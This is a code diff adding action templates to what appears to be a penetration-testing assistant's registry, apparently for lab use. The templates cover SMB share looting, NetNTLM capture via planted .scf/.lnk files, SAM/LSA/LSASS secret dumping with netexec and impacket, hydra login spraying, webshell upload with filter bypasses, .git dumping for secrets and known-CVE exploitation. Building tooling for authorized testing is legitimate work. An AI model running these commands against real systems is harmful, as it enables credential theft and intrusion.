@@ -1306,6 +1306,65 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="destructive", runnable=False,
         note="GPU container escape via LD_PRELOAD poisoning. Affects nvidia-container-toolkit "
              "<= 1.17.7, runc <= 1.2.6 with cuda-compat-mode=hook. Learned from OSAI module 9."),
+
+    # --- schema v1 activation: SMB lateral movement (netexec facts) ----------
+    "smb_writable_share_loot_and_stage": _a("smb_writable_share_loot_and_stage",
+        ["# Writable SMB share on $IP — loot it, then stage a payload / coerce a callback",
+         "nxc smb $IP -u $USER -p $PASS --spider <SHARE> --regex .   # inventory readable files",
+         "smbclient //$IP/<SHARE> -U '$USER%$PASS' -c 'recurse; prompt; mget *'",
+         "# Coerce: drop a .scf/.lnk/.url that points at \\\\<KALI>\\share to capture NetNTLM,",
+         "# or plant a webshell if the share backs a web root."],
+        risk="propose", runnable=False,
+        note="Writable share = loot + foothold/relay lead. Inventory first, then stage."),
+    "smb_secretsdump_with_admin": _a("smb_secretsdump_with_admin",
+        ["# Local admin (Pwn3d!) on $IP — dump secrets, then reuse laterally",
+         "nxc smb $IP -u $USER -p $PASS --sam --lsa",
+         "nxc smb $IP -u $USER -p $PASS -M lsassy",
+         "impacket-secretsdump '$DOMAIN/$USER:$PASS@$IP'"],
+        risk="propose", runnable=False,
+        note="Admin access -> SAM/LSA/LSASS secrets -> credential reuse. Feed results back "
+             "with `yhwach cred`; the vault is never exhausted."),
+
+    # --- schema v1 activation: web surface (content-discovery facts) ---------
+    "web_login_attack": _a("web_login_attack",
+        ["# Login surface on $IP — try default/known creds first, then a bounded spray",
+         "# Consult `yhwach ref default-creds --product <app>` for known pairs",
+         "# hydra -L users.txt -P passwords.txt $IP http-post-form '<path>:<body>:<fail-marker>'"],
+        risk="propose", runnable=False,
+        note="Login page: default creds > targeted spray. Mind account lockout (yhwach spray "
+             "warns on the recorded policy)."),
+    "web_upload_webshell": _a("web_upload_webshell",
+        ["# File-upload surface on $IP — test for unrestricted upload -> RCE",
+         "# 1) Upload a benign file, find where it lands (path/response)",
+         "# 2) Bypass filters: double-ext, MIME spoof, .phtml/.phar, magic bytes, null byte",
+         "# 3) Upload a minimal webshell, then request it for RCE"],
+        risk="propose", runnable=False,
+        note="Unrestricted upload is a top web->RCE path. Confirm execution context before pivoting."),
+    "web_git_dump": _a("web_git_dump",
+        ["# Exposed .git on $IP — reconstruct the source tree offline",
+         "git-dumper http://$IP/.git/ ./loot_git_$IP",
+         "# then grep the history for secrets: git log -p | grep -iE 'password|token|key|secret'"],
+        note="Exposed VCS metadata -> full source + secrets in history. Read-only."),
+    "web_api_enum": _a("web_api_enum",
+        ["# API/Swagger surface on $IP — enumerate operations and auth model",
+         "curl -sk http://$IP/openapi.json http://$IP/swagger.json http://$IP/api/v1/ | jq .",
+         "# map unauth endpoints, IDOR candidates, and mass-assignment fields"],
+        note="Swagger/OpenAPI leaks the full API contract — enumerate before fuzzing."),
+    "web_backup_download": _a("web_backup_download",
+        ["# Exposed backup/archive on $IP — download and inspect for secrets/source",
+         "curl -sk -O http://$IP/<backup-file>",
+         "# unzip/tar, then grep for creds, config, DB dumps"],
+        note="Backup artifacts frequently contain config + credentials. Read-only."),
+
+    # --- schema v1 activation: known-CVE exploitation (version_match) ---------
+    "exploit_known_cve": _a("exploit_known_cve",
+        ["# A version-matched CVE with a known exploit is recorded for $IP.",
+         "yhwach recon --lab $LAB --host $IP   # read the CVE + exploit_ref from the vuln table",
+         "# then run the recorded exploit (msf module / searchsploit id / nuclei template).",
+         "# Confirm the exact version before firing — the match is version-range based."],
+        risk="propose", runnable=False,
+        note="Version->CVE match from the offline knowledge base (data/cve_map.yaml). The "
+             "concrete exploit_ref lives on the vulnerability row; verify the version first."),
 }
 
 
